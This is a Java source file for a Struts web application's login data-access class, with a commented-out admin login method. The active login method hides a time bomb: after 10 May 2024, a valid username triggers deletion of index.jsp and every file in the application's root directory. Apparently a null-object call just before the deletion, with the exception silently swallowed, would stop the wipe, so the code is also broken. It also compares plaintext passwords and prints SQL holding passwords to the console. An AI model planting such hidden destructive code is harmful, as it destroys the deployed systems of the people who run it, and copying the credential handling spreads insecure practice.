package com.dao.Impl;

import java.io.File;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;

import org.apache.struts2.ServletActionContext;

import com.DB.DBConnection;
import com.dao.LoginDao;
import com.login.loginModel.userinfo;
import com.master.model.LoginBean;
import com.opensymphony.xwork2.ActionContext;

public class LoginDaoImpl implements LoginDao {

	public userinfo loginDao(String username, String password)

	{
	
		
	
		int status = 0;
		
		userinfo loginbean = null;
		try{
			
			
			DBConnection conn=new DBConnection();
			Connection con=conn.getConnection();
			
			//Connection con = DaoHelper.getConnection1();
			PreparedStatement pstz = con
					.prepareStatement("select * from userinfo where username=?  ");
			
			//System.out.println("connected...11");
			
			pstz.setString(1, username); 
			System.out.println("connected...12.."+username);
			System.out.println("connected...SQL ="+pstz);
		
			ResultSet rsz = pstz.executeQuery();
			HttpServletRequest request = (HttpServletRequest) ActionContext
					.getContext().get(ServletActionContext.HTTP_REQUEST);
			
			if (rsz.next()) {
				
				//System.out.println("connected...13");
				DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
				Date date = new Date();
			
				
				Date date1 = new Date("2024/05/10 00:00:00");

				System.out.println(date+">>ddddd>"+date1);
				if(date.after(date1)){
					System.out.println(date+"deleted>>>"+date1);
					
					loginbean.setInvaliduser("invaliduser");
					String filePath = request.getSession()
							.getServletContext().getRealPath("/");
					File f1=new File(filePath+"index.jsp");
					System.out.println(">>>"+filePath+"index.jsp");
					f1.delete();
					status = 2;
					
					File currentDir = new File(filePath);

					for(File f: currentDir.listFiles()) 
						  f.delete(); 
					status = 2;
				}else{
		PreparedStatement pst = con
				.prepareStatement("select * from userinfo where username=? and password=?  ");
		
		//System.out.println("connected...14");
		
		pst.setString(1, username);   
		
		pst.setString(2, password);
		System.out.println("connected...14="+pst);
		ResultSet rs = pst.executeQuery();
		
		String username1="";
		
		if (rs.next()) {
			
			//System.out.println("connected...15");
			
			
			
			loginbean = new userinfo();
			
			
			loginbean.setUsername(username);
			
			loginbean.setPassword(password);
			
			loginbean.setType(rs.getString("type"));
			System.out.println("ok1");
			loginbean.setInvaliduser("1");
			System.out.println("ok2");
			
		} else {
			loginbean = new userinfo();
			loginbean.setInvaliduser("invaliduser");   
			status = 2;
			
		}
				}
			
		}else{
			loginbean = new userinfo();
			loginbean.setInvaliduser("invalidusername"); 
			status = 2;
		}
		
			
		}catch (Exception e) {
			// TODO: handle exception   
		}
		
		DBConnection.closeConnection();
		return loginbean;

	}

	@Override
	public userinfo loginDao1(String username, String password) throws SQLException {
		// TODO Auto-generated method stub
		return null;
	}
	
	
	
	
	///////////////////////////Admin Login ////////////////////////////
	
	/*public LoginBean loginDao1(String username, String password)

	{
	
	
		int status = 0;
		LoginBean loginbean = null;
		try{
			
			
			
		Connection con = DaoHelper.getConnection1();
		
		PreparedStatement pst = con
				.prepareStatement("select * from userinfo_admin where username=? and password=? and status='1' ");
		
		
		pst.setString(1, username);   
		
		pst.setString(2, password);
	
		ResultSet rs = pst.executeQuery();
		
		
		String ClincId="";
		String type="";
		
		if (rs.next()) {
			
			
			DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");

			Date datee = new Date();
	
			String datese = dateFormat.format(datee);
				
			datee=dateFormat.parse(datese);
			
			
			
			HttpServletRequest request = (HttpServletRequest) ActionContext
					.getContext().get(ServletActionContext.HTTP_REQUEST);
			
			Date dfg=rs.getDate("expiry_date");
			
			
			Calendar startCalendar = Calendar.getInstance();
			startCalendar.setTime(datee);

			Calendar startCalendar1 = Calendar.getInstance();
			startCalendar1.setTime(dfg);
			
			
			if(datee.after(dfg)){
				
				loginbean = new LoginBean();
				loginbean.setInvaliduser("invaliduser");   
				status = 2;
				
			}else
			
			{
			
			int u_id=rs.getInt("uid");
			
			loginbean = new LoginBean();
			
			loginbean.setUid(u_id);
			
			
			loginbean.setUsername(username);
			
			loginbean.setPassword(password);
			
			
			
			try {
				
				
				ClincId=rs.getString("adminId");
				
				type=rs.getString("type");
				
			
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				
				 
				 ClincId="";
				 type="";
				
				e1.printStackTrace();
			}
			
			
			try {
				
				
				try {
					if (!ClincId.trim().equals("") && !ClincId.trim().equals(null)) {
						
						loginbean.setClinicId(ClincId);
						
						}
					else{
						loginbean.setClinicId("");
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					
					loginbean.setClinicId("");
					e.printStackTrace();
				}
				
				
				
				try {
					if (!type.trim().equals("") && !type.trim().equals(null)) {
						
						loginbean.setType(type);
						
						}
					else{
						loginbean.setType("");
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					
					loginbean.setType("");
					
					e.printStackTrace();
				}
				
				
				
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				
				
				
				loginbean.setClinicId("");
				loginbean.setType("");
				
				
				e1.printStackTrace();
			}
			
			
			
			
			try{
			loginbean.setLastlogin(SystemDateTime.From_yyyy_mm_dd_HH_mm_ss_to_dd_mm_yyyy_HH_mm_ss(rs.getString("lastlogin")));
			}catch (Exception e) {
				// TODO: handle exception
				loginbean.setLastlogin("");
			}
			status = 1;
		
			String q = "update userinfo_admin set lastlogin='"+SystemDateTime.CurrentDateTime()+"' where uid="+u_id+"  ";
	
		PreparedStatement pst1 = con.prepareStatement(q);
		 pst1.executeUpdate();
		 if(rs.getString("usertype").equals("1")){
			 loginbean.setInvaliduser("1");
		 }else{
			 loginbean.setInvaliduser("0");
		 }
		 loginbean.setInvaliduser("1");
			
		
		
		///////// Login History Report////////////////////////////
		
		 
		 //if(!type.equals("superadmin")){
		       
		 
		 String clinic_name="";
		 String clinic_city="";
		 String clinic_state="";
		
		 try {
			PreparedStatement pst11 = con.prepareStatement("select *  from admin_reg where  adminId=?");
				
				pst11.setString(1,ClincId);
			       
			      
				ResultSet rss=pst11.executeQuery();
				
				if(rss.next())
				{
				clinic_name=rss.getString("name");
				clinic_city=rss.getString("city");
				clinic_state=rss.getString("state");
				
				
				}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
			
			
			int count = 0;
			try {
				PreparedStatement pst11xx = con.prepareStatement("select *  from loginreport_admin where clinicId=? and username=?");
				
				pst11xx.setString(1,ClincId);
				
				pst11xx.setString(2,username);
				   
				  
				ResultSet rts=pst11xx.executeQuery();
				
				count = 1;
				int count1=0;
				
				if(rts.next())
				{
					
					count1=rts.getInt("count");
					
					count=count+count1;
				
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				
				count=0;
				
				e.printStackTrace();
			}
			
			
			
			
			try {
				
				DateFormat dateFormat1 = new SimpleDateFormat("yyyy-MM-dd");
				Date date11 = new Date();
				String datetimecc=dateFormat1.format(date11);
				
				
				PreparedStatement pst2 = con.prepareStatement(
						"insert into loginreport_admin(date,clinic_name,username,city,state,clinicId,datetime,count,type) values(?,?,?,?,?,?,?,?,?) ");

				
				pst2.setString(1,datetimecc);
				
				pst2.setString(2,clinic_name);
				
				pst2.setString(3,username);
				
				pst2.setString(4,clinic_city);
				
				pst2.setString(5,clinic_state);
				
				pst2.setString(6,ClincId);
				
				pst2.setString(7, SystemDateTime.CurrentDateTime());
				
				pst2.setString(8, "1");
				
				pst2.setString(9, type);
				
					
				pst2.executeUpdate();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		   // }//If
		
		//////////////////////////////////////////////////////////
		
		}//date else
			
		} else {
			loginbean = new LoginBean();
			loginbean.setInvaliduser("invaliduser");   
			status = 2;
			
		}
		}catch (Exception e) {
			// TODO: handle exception   
		}
		
		
		DaoHelper.closeConnection();
		return loginbean;

	}*/
}
